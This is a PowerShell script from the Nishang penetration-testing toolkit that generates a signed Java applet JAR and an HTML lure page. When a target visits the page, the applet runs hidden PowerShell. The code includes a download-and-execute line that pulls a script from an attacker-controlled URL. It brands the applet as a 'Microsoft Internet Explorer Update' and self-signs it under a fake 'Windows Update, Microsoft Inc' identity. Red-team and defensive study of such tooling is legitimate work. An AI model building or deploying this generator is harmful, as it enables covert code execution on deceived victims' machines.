
function Out-Java
{

<#
.SYNOPSIS
Nishang script which could be used for generating JAR to be used for applets.

.DESCRIPTION
The script generates a Signed JAR and one line HTML code. These could be deployed on a web server. When a target opens
up the URL hosting these, the predefined PowerShell commands and scripts could be executed on the target.

If you want to use valid/trusted certificate for signing use the -NoSelfSign option.

The JAR generated checks for the OS architecture and calls the 32-bit version of PowerShell for script execution.
So you need to pass only the 32 bit shellcode to it. In case you would like to use 64 bit PowerShell, remove the "if"
condition marked in the source of Java code being generated.

The script needs JDK to be installed on the attacker's machine. The parameters passed to keytool and jarsigner
could be changed in the source for further customization. Those are not asked as function parameters to keep the 
number of parameters less for easy usage.

.PARAMETER Payload
Payload which you want execute on the target.

.PARAMETER $PayloadURL
URL of the powershell script which would be executed on the target.

.PARAMETER $Arguments
Arguments to the powershell script to be executed on the target.

.PARAMETER $JDKPath
Patj to the JDK to compile the .Java code.

.PARAMETER $OutputPath
Path to the directory where the files would be saved. Default is the current directory.

.PARAMETER $NoSelfSign
Use this switch if you don't want to create a self signed certificate for signing the JAR.

.EXAMPLE
PS > Out-Java -Payload "Get-Process" -JDKPath "C:\Program Files\Java\jdk1.7.0_25"

Above command would execute Get-Process on the target machine when the JAR or Class file is executed.

.EXAMPLE
PS > Out-Java -PayloadURL http://192.168.254.1/Get-Information.ps1 -JDKPath "C:\Program Files\Java\jdk1.7.0_25"

Use above command to generate JAR which download and execute the given powershell script in memory on target.

.EXAMPLE
PS > Out-Java -Payload "-e <EncodedScript>" -JDKPath "C:\Program Files\Java\jdk1.7.0_25"

Use above command to generate JAR which executes the encoded script.
Use Invoke-Command from Nishang to encode the script.

.EXAMPLE
PS > Out-Java -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -JDKPath "C:\Program Files\Java\jdk1.7.0_25"

Use above command to pass an argument to the powershell script/module.

.EXAMPLE
PS > Out-Java -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -JDKPath "C:\Program Files\Java\jdk1.7.0_25" -NoSelfSign

Due to the use of -NoSelfSign in above command, no self signed certificate would be used to sign th JAR.

.LINK
http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
https://github.com/samratashok/nishang
#>



    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $PayloadURL,

        
        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Arguments,

        [Parameter(Position = 3, Mandatory = $True)]
        [String]
        $JDKPath,

        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $OutputPath="$pwd",

        [switch]
        $NoSelfSign


    )


    if(!$Payload)
    {
        $Payload = "IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }    

#Java code taken from the Social Enginnering Toolkit (SET) by David Kennedy
    $JavaClass = @"
import java.applet.*;
import java.awt.*;
import java.io.*;
public class JavaPS extends Applet {
public void init() {
Process f;
//http://stackoverflow.com/questions/4748673/how-can-i-check-the-bitness-of-my-os-using-java-j2se-not-os-arch/5940770#5940770
String arch = System.getenv("PROCESSOR_ARCHITECTURE");
String wow64Arch = System.getenv("PROCESSOR_ARCHITEW6432");
String realArch = arch.endsWith("64") || wow64Arch != null && wow64Arch.endsWith("64") ? "64" : "32";
String cmd = "powershell.exe -WindowStyle Hidden -nologo -noprofile $Payload";
//Remove the below if condition to use 64 bit powershell on 64 bit machines.
if (realArch == "64")
{
    cmd = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle Hidden -nologo -noprofile $Payload";
}
try {
f = Runtime.getRuntime().exec(cmd);
}
catch(IOException e) {
e.printStackTrace();
}
Process s;
}
}
"@


    #Compile the Java file
    $JavaFile = "$OutputPath\JavaPS.java"
    Out-File -InputObject $JavaClass -Encoding ascii -FilePath $JavaFile
    $JavacPath = "$JDKPath" + "\bin\javac.exe"
    & "$JavacPath" "$JavaFile"

    #Create a manifest for JAR, taken from SET
    $Manifest = @"
Permissions: all-permissions
Codebase: *
Application-Name: Microsoft Internet Explorer Update (SECURE)
"@
    $ManifestFile = "$OutputPath\manifest.txt"
    Out-File -InputObject $Manifest -Encoding ascii -FilePath $ManifestFile

    #Create the JAR
    $Jarpath = "$JDKPath" + "\bin\jar.exe"
    & "$JarPath" "-cvfm" "$OutputPath\JavaPS.jar" "$ManifestFile" "JavaPS.class"
    
    #Parameters passed to keytool and jarsigner. You may change these to your choice.
    $KeystoreAlias = "SignApplet"
    $KeyStore = "PSKeystore"
    $StorePass = "PSKeystorePass"
    $KeyPass = "PSKeyPass"
    $DName = "cn=Windows Update, ou=Microsoft Inc, o=Microsoft Inc, c=US"

    if ($NoSelfSign -eq $False)
    {
        #Generate a keypair for self-signing
        #http://rvnsec.wordpress.com/2014/09/01/ps1encode-powershell-for-days/
        $KeytoolPath = "$JDKPath" + "\bin\keytool.exe"
        & "$KeytoolPath" "-genkeypair" "-alias" "$KeystoreAlias" "-keystore" "$KeyStore" "-keypass" "$KeyPass" "-storepass" "$StorePass" "-dname" "$DName"

        #Self sign the JAR
        $JarSignerPath = "$JDKPath" + "\bin\jarsigner.exe"
        & "$JarSignerPath" "-keystore" "$KeyStore" "-storepass" "$StorePass" "-keypass" "$KeyPass" "-signedjar" "$OutputPath\SignedJavaPS.jar" "$OutputPath\JavaPS.jar" "SignApplet"
    
        #Output simple html. This could be used with any cloned web page.
        #Host this HTML and SignedJarPS.jar on a web server.
        $HTMLCode = @'
        <div> 
    <object type="text/html" data="http://windows.microsoft.com/en-IN/internet-explorer/install-java" width="100%" height="100%">
    </object></div>
    <applet code="JavaPS" width="1" height="1" archive="SignedJavaPS.jar" > </applet>'
'@
        $HTMLFile = "$OutputPath\applet.html"
        Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile   

        #Cleanup
        Remove-Item "$OutputPath\PSKeyStore"
        Remove-Item "$OutputPath\JavaPS*"
    }
    elseif ($NoSelfSign -eq $True)
    {
        Write-Warning "You chose not to self sign. Use your valid certificate to sign the JavaPS.jar manually."
        #Cleanup
        Remove-Item "$OutputPath\JavaPS.java"
        Remove-Item "$OutputPath\JavaPS.class"
    }    
    #Cleanup to remove temporary files
    Remove-Item "$OutputPath\manifest.txt"
}

